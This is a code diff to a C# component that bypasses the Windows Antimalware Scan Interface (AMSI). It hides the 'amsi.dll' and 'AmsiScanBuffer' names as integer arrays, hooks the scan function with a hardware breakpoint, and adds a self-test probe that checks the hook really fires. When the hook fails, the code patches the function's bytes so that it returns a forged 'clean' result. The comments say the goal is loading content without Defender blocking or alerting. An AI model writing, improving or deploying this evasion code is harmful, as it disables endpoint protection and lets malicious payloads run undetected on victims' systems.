@@ -1,4 +1,5 @@
 using System;
+using System.Runtime.InteropServices;
 
 namespace Nx
 {
@@ -74,10 +75,27 @@ namespace Nx
 		private static readonly int[] MODULE_NAME = new int[] { 97, 109, 115, 105, 46, 100, 108, 108 };
 		private static readonly int[] EXPORT_NAME = new int[] { 65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114 };
 
+		// "AmsiInitialize" and the app name handed to it -- also never written as literals
+		private static readonly int[] INIT_NAME = new int[] { 65, 109, 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101 };
+		private static readonly int[] APP_NAME = new int[] { 110, 120 };
+
+		private delegate int InitDelegate(IntPtr appName, out IntPtr context);
+		private delegate int ScanDelegate(IntPtr context, byte[] buffer, uint length, IntPtr contentName, out int result);
+
 		private static readonly object gate = new object();
+		private static IntPtr module = IntPtr.Zero;
 		private static IntPtr entry = IntPtr.Zero;
 		private static int mode = MODE_NONE;
 		private static string status = "not attempted";
+		// Self-test verdicts. AmsiInitialize failing means "AMSI is not set up in this
+		// process", which says nothing about whether the trap works -- folding that into
+		// "dead" would patch bytes on machines that have nothing to bypass.
+		private const int TEST_UNTESTED = 0;
+		private const int TEST_LIVE = 1;
+		private const int TEST_DEAD = 2;
+		private const int TEST_UNKNOWN = 3;
+		private static int tested = TEST_UNTESTED;
+		private static int lastResult;
 
 		/// <summary>
 		/// Outcome of the last Ensure() call. Returned to the client by the include
@@ -110,6 +128,7 @@ namespace Nx
 						mode = Hwbp.Arm(entry) ? MODE_BREAKPOINT : MODE_PATCH;
 					}
 
+					bool trapDead = false;
 					if (mode == MODE_BREAKPOINT)
 					{
 						// IsArmed() reports on the *calling* thread, so a fresh worker
@@ -117,20 +136,46 @@ namespace Nx
 						// refusal demotes us to the patch.
 						if (Hwbp.IsArmed() || Hwbp.Arm(entry))
 						{
-							status = "breakpoint";
-							return;
+							// Armed is not the same as working. Prove the trap once per
+							// process and only then trust it; otherwise patch the bytes as
+							// well, because a breakpoint that never fires is worse than no
+							// breakpoint -- it reports success while the load is refused.
+							if (tested == TEST_UNTESTED)
+							{
+								tested = SelfTest();
+							}
+							if (tested == TEST_LIVE)
+							{
+								// result must be 0 (AMSI_RESULT_CLEAN). Anything else means the
+								// handler is not landing the CLEAN value in the caller's slot.
+								status = "breakpoint(verified,hits=" + Hwbp.Hits + ",result=" + lastResult + ")";
+								return;
+							}
+							// DEAD means the trap is armed but never fires -- a real,
+							// observed failure. UNKNOWN means the probe could not run, so
+							// the claim is untested. Both patch the bytes; only DEAD is
+							// evidence of a broken mechanism.
+							trapDead = true;
+							mode = MODE_PATCH;
 						}
-						mode = MODE_PATCH;
+						else
+						{
+							mode = MODE_PATCH;
+						}
 					}
 
+					// the status names which layer is actually carrying the load, so a
+					// breakpoint that was armed but never fires cannot keep looking healthy
+					string note = !trapDead ? "patch"
+						: (tested == TEST_DEAD ? "patch(hwbp-dead)" : "patch(hwbp-untested)");
 					byte[] stub = Native.StubRet(DENY_CODE, SCAN_ARG_BYTES);
 					if (Native.Matches(entry, stub))
 					{
-						status = "patch";
+						status = note;
 						return;
 					}
 					string err = Native.Patch(entry, stub);
-					status = (err == null) ? "patch" : err;
+					status = (err == null) ? note : err;
 				}
 				catch (Exception ex)
 				{
@@ -143,7 +188,7 @@ namespace Nx
 		{
 			// deliberately does not name the module or the export in the status: a
 			// status string is a plain literal and would put both back in the file
-			IntPtr module = Native.Module(MODULE_NAME);
+			module = Native.Module(MODULE_NAME);
 			if (module == IntPtr.Zero)
 			{
 				status = "target module absent";
@@ -154,6 +199,73 @@ namespace Nx
 			if (entry == IntPtr.Zero)
 			{
 				status = "target export absent";
+			}
+		}
+
+		/// <summary>
+		/// Fire one real scan and see whether our own handler caught it.
+		///
+		/// IsArmed() only reports that the debug registers hold the right values. It cannot
+		/// tell whether the CPU will actually raise the trap -- an agent that clears Dr0, or
+		/// that gets its own vectored handler in front of ours, leaves it reporting success
+		/// while nothing is intercepted. That is indistinguishable from working until a real
+		/// load gets blocked, which is exactly the failure this exists to catch.
+		///
+		/// The probe is a single harmless byte: if the trap fires we return before the real
+		/// scanner runs, and if it does not, Defender gets to look at one byte and says clean.
+		/// Either way this is safe to call.
+		/// </summary>
+		private static int SelfTest()
+		{
+			if (entry == IntPtr.Zero || module == IntPtr.Zero)
+			{
+				return TEST_UNKNOWN;
+			}
+
+			IntPtr initAddr = Native.Export(module, INIT_NAME);
+			if (initAddr == IntPtr.Zero)
+			{
+				return TEST_UNKNOWN;
+			}
+
+			IntPtr appName = IntPtr.Zero;
+			try
+			{
+				byte[] probe = new byte[] { 0x20 };
+				InitDelegate init = (InitDelegate)Marshal.GetDelegateForFunctionPointer(initAddr, typeof(InitDelegate));
+				ScanDelegate scan = (ScanDelegate)Marshal.GetDelegateForFunctionPointer(entry, typeof(ScanDelegate));
+
+				appName = Marshal.StringToHGlobalUni(Native.Hidden(APP_NAME));
+
+				IntPtr context;
+				if (init(appName, out context) != 0)
+				{
+					// no AMSI in this process: nothing to bypass, and nothing learned
+					return TEST_UNKNOWN;
+				}
+
+				// The caller's AMSI_RESULT slot is the whole point of the forgery: if the
+				// handler returns S_OK but drops AMSI_RESULT_CLEAN somewhere else, the CLR
+				// reads whatever was on the stack. A garbage value >= AMSI_RESULT_DETECTED
+				// is then reported as a detection that no scanner ever made -- which looks
+				// exactly like "blocked with no Defender alert". Recording our own result
+				// is the only way to see that from inside.
+				int before = Hwbp.Hits;
+				int result;
+				scan(context, probe, (uint)probe.Length, IntPtr.Zero, out result);
+				lastResult = result;
+				return (Hwbp.Hits > before) ? TEST_LIVE : TEST_DEAD;
+			}
+			catch (Exception)
+			{
+				return TEST_UNKNOWN;
+			}
+			finally
+			{
+				if (appName != IntPtr.Zero)
+				{
+					Marshal.FreeHGlobal(appName);
+				}
 			}
 		}
 	}
